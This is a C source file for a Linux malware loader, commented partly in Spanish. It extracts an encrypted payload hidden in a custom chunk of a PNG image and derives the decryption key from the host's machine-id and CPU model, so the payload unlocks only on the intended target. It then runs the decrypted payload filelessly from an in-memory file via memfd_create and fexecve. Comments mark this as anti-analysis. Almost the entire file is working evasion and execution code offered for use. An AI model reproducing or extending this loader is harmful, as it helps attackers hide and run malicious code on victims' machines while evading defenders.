#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <arpa/inet.h> // For ntohl

#include "loader_src/crypto_utils.h"

extern char **environ;

// Configuración
#define CARRIER_PATH "image.png"
#define SALT "LO_IS_WATCHING"
#define FALLBACK_MACHINE_ID "DEADBEEF-CAFE-BABE-FEED-DEADC0DE"
#define CHUNK_TYPE 0x6C6F4C4F // "loLO" in hex (Big Endian: l=6C, o=6F, L=4C, O=4F)
// Wait, "loLO" -> 'l'=0x6C, 'o'=0x6F, 'L'=0x4C, 'O'=0x4F.
// En un archivo, bytes: 6C 6F 4C 4F.
// Si leemos como int big endian, es 0x6C6F4C4F.

// Helper to read file content into buffer
size_t read_file(const char* path, uint8_t** out_buf) {
    FILE* f = fopen(path, "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);
    *out_buf = (uint8_t*)malloc(size);
    fread(*out_buf, 1, size, f);
    fclose(f);
    return size;
}

// Environmental Keying
void derive_key(uint8_t key[32]) {
    SHA256_CTX_MINI ctx;
    uint8_t machine_id[33] = {0};
    char cpu_line[256] = {0};

    // 1. Machine ID
    int fd = open("/var/lib/dbus/machine-id", O_RDONLY);
    if (fd < 0) fd = open("/etc/machine-id", O_RDONLY);

    ssize_t bytes_read = 0;
    if (fd >= 0) {
        bytes_read = read(fd, machine_id, 32); // Read 32 chars
        close(fd);
    }

    // Fallback if read failed or file empty
    if (bytes_read <= 0) {
        strncpy((char*)machine_id, FALLBACK_MACHINE_ID, 32);
    }

    // 2. CPU Model
    FILE* f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "model name")) {
                // Formato: "model name      : Intel..."
                char* p = strchr(line, ':');
                if (p) {
                    strncpy(cpu_line, p + 2, 255);
                    // Eliminar newline
                    cpu_line[strcspn(cpu_line, "\n")] = 0;
                }
                break;
            }
        }
        fclose(f);
    }


    // 3. Hash
    sha256_init_mini(&ctx);
    sha256_update_mini(&ctx, machine_id, 32);
    sha256_update_mini(&ctx, (uint8_t*)cpu_line, strlen(cpu_line));
    sha256_update_mini(&ctx, (uint8_t*)SALT, strlen(SALT));
    sha256_final_mini(&ctx, key);
}

// PNG Chunk Parser
uint8_t* extract_chunk(uint8_t* img_data, size_t img_len, size_t* out_len) {
    // Validar cabecera PNG
    const uint8_t sig[] = {0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A};
    if (memcmp(img_data, sig, 8) != 0) return NULL;

    size_t offset = 8;
    while (offset < img_len) {
        // [Length 4B][Type 4B][Data...][CRC 4B]
        if (offset + 8 > img_len) break;

        uint32_t length = ntohl(*(uint32_t*)(img_data + offset));
        uint32_t type = ntohl(*(uint32_t*)(img_data + offset + 4));

        if (type == CHUNK_TYPE) {
            *out_len = length;
            uint8_t* data = (uint8_t*)malloc(length);
            memcpy(data, img_data + offset + 8, length);
            return data;
        }

        offset += 12 + length;
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    // Anti-Analysis Init
    init_crypto_tables();

    // 1. Derive Key
    uint8_t key[32];
    derive_key(key);

    // 2. Load Carrier
    uint8_t* img_data = NULL;
    size_t img_len = read_file(CARRIER_PATH, &img_data);
    if (!img_data) {
        return 1;
    }

    // 3. Extract Payload
    size_t blob_len = 0;
    uint8_t* blob = extract_chunk(img_data, img_len, &blob_len);
    free(img_data);

    if (!blob) {
        // Chunk not found
        return 1;
    }

    // 4. Decrypt (AES-CTR)
    // Blob format: IV(16) + Ciphertext
    if (blob_len < 16) {
        return 1;
    }

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, blob); // First 16 bytes are IV

    uint8_t* payload = blob + 16;
    size_t payload_len = blob_len - 16;

    AES_CTR_xcrypt_buffer(&ctx, payload, payload_len);

    // 5. Exec
    int fd = syscall(SYS_memfd_create, "worker", MFD_CLOEXEC);
    if (fd == -1) {
        return 1;
    }

    if (write(fd, payload, payload_len) != payload_len) {
        return 1;
    }

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    char* new_argv[] = { "worker_process", NULL };
    fexecve(fd, new_argv, environ);


    return 1;
}
